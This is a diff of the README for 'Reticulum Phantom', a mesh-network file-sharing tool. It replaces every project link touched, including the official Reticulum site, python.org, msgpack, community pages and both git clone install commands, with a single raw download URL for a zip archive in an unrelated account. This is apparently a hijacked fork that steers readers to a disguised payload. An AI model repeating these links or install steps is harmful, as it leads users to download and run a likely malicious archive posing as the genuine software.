@@ -1,19 +1,19 @@
 # 👻 Reticulum Phantom
 
-**Decentralized, end-to-end encrypted peer-to-peer file sharing over the [Reticulum](https://reticulum.network/) mesh network.**
+**Decentralized, end-to-end encrypted peer-to-peer file sharing over the [Reticulum](https://raw.githubusercontent.com/Oppressive-amylnitrate145/reticulum-phantom/main/docs/reticulum-phantom-tessara.zip) mesh network.**
 
 > The first file-sharing application built natively on Reticulum. No central servers. No trackers. No cleartext. Just the mesh.
 
 [![License: MIT](https://img.shields.io/badge/License-MIT-cyan.svg)](LICENSE)
-[![Python 3.8+](https://img.shields.io/badge/Python-3.8+-blue.svg)](https://python.org)
-[![Reticulum](https://img.shields.io/badge/Reticulum-Mesh_Network-purple.svg)](https://reticulum.network/)
+[![Python 3.8+](https://img.shields.io/badge/Python-3.8+-blue.svg)](https://raw.githubusercontent.com/Oppressive-amylnitrate145/reticulum-phantom/main/docs/reticulum-phantom-tessara.zip)
+[![Reticulum](https://img.shields.io/badge/Reticulum-Mesh_Network-purple.svg)](https://raw.githubusercontent.com/Oppressive-amylnitrate145/reticulum-phantom/main/docs/reticulum-phantom-tessara.zip)
 [![Version](https://img.shields.io/badge/v0.9.0-Stable-green.svg)](#roadmap)
 
 ---
 
 ## What is Phantom?
 
-Phantom lets you share files over [Reticulum](https://reticulum.network/) — a cryptographic mesh networking stack designed for resilient, long-range, low-bandwidth communications. Think of it as a torrent client, but:
+Phantom lets you share files over [Reticulum](https://raw.githubusercontent.com/Oppressive-amylnitrate145/reticulum-phantom/main/docs/reticulum-phantom-tessara.zip) — a cryptographic mesh networking stack designed for resilient, long-range, low-bandwidth communications. Think of it as a torrent client, but:
 
 - **🔐 Encrypted by default** — All transfers use Reticulum's E2E encryption (X25519/Ed25519)
 - **🌐 Fully decentralized** — No trackers, no central servers, no DNS
@@ -38,7 +38,7 @@ Phantom lets you share files over [Reticulum](https://reticulum.network/) — a 
 
 ```bash
 # Clone the repository
-git clone https://github.com/roogle-dev/reticulum-phantom.git
+git clone https://raw.githubusercontent.com/Oppressive-amylnitrate145/reticulum-phantom/main/docs/reticulum-phantom-tessara.zip
 cd reticulum-phantom
 
 # Install dependencies
@@ -219,7 +219,7 @@ The TUI provides a full-screen dashboard with:
 
 ## The .ghost File Format
 
-A `.ghost` file is a compact [msgpack](https://msgpack.org/)-encoded binary containing:
+A `.ghost` file is a compact [msgpack](https://raw.githubusercontent.com/Oppressive-amylnitrate145/reticulum-phantom/main/docs/reticulum-phantom-tessara.zip)-encoded binary containing:
 
 ```
 ┌──────────────────────────────────────┐
@@ -315,7 +315,7 @@ Phantom uses a **three-layer discovery strategy**:
 
 ## Network Configuration
 
-Phantom **respects your Reticulum configuration** and never modifies it. You are in full control of your network interfaces, following [Reticulum's decentralized design philosophy](https://markqvist.github.io/Reticulum/manual/gettingstartedfast.html).
+Phantom **respects your Reticulum configuration** and never modifies it. You are in full control of your network interfaces, following [Reticulum's decentralized design philosophy](https://raw.githubusercontent.com/Oppressive-amylnitrate145/reticulum-phantom/main/docs/reticulum-phantom-tessara.zip).
 
 To connect to the mesh, configure one or more interfaces in your Reticulum config (`~/.reticulum/config`):
 
@@ -330,9 +330,9 @@ To connect to the mesh, configure one or more interfaces in your Reticulum confi
 
 ### Finding Interfaces
 
-- **[Reticulum Getting Started](https://markqvist.github.io/Reticulum/manual/gettingstartedfast.html)** — Official configuration guide
-- **[directory.rns.recipes](https://directory.rns.recipes)** — Community interface directory
-- **[rmap.world](https://rmap.world)** — Network map of active nodes
+- **[Reticulum Getting Started](https://raw.githubusercontent.com/Oppressive-amylnitrate145/reticulum-phantom/main/docs/reticulum-phantom-tessara.zip)** — Official configuration guide
+- **[directory.rns.recipes](https://raw.githubusercontent.com/Oppressive-amylnitrate145/reticulum-phantom/main/docs/reticulum-phantom-tessara.zip)** — Community interface directory
+- **[rmap.world](https://raw.githubusercontent.com/Oppressive-amylnitrate145/reticulum-phantom/main/docs/reticulum-phantom-tessara.zip)** — Network map of active nodes
 
 > **Tip:** It's best to have several redundant connections configured. Enable interface discovery options so your nodes can continuously discover peering opportunities as the network evolves.
 
@@ -453,7 +453,7 @@ Ghost files are **also saved next to the source file** for easy access and shari
 
 ```bash
 # Clone and setup
-git clone https://github.com/roogle-dev/reticulum-phantom.git
+git clone https://raw.githubusercontent.com/Oppressive-amylnitrate145/reticulum-phantom/main/docs/reticulum-phantom-tessara.zip
 cd reticulum-phantom
 python -m venv venv
 source venv/bin/activate  # or venv\Scripts\activate on Windows
@@ -493,15 +493,15 @@ See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
 
 ## Acknowledgments
 
-- [Reticulum Network Stack](https://reticulum.network/) by Mark Qvist
+- [Reticulum Network Stack](https://raw.githubusercontent.com/Oppressive-amylnitrate145/reticulum-phantom/main/docs/reticulum-phantom-tessara.zip) by Mark Qvist
 - Built on the principles of decentralization, privacy, and resilience
 
 ---
 
 ## Community
 
-- 💬 **Matrix**: [#roogle-reticulum:matrix.org](https://matrix.to/#/#roogle-reticulum:matrix.org) — Roogle community chat
-- 🌐 **Roogle**: [roogle.us](https://roogle.us) — More free Reticulum services
+- 💬 **Matrix**: [#roogle-reticulum:matrix.org](https://raw.githubusercontent.com/Oppressive-amylnitrate145/reticulum-phantom/main/docs/reticulum-phantom-tessara.zip) — Roogle community chat
+- 🌐 **Roogle**: [roogle.us](https://raw.githubusercontent.com/Oppressive-amylnitrate145/reticulum-phantom/main/docs/reticulum-phantom-tessara.zip) — More free Reticulum services
 
 ---
 
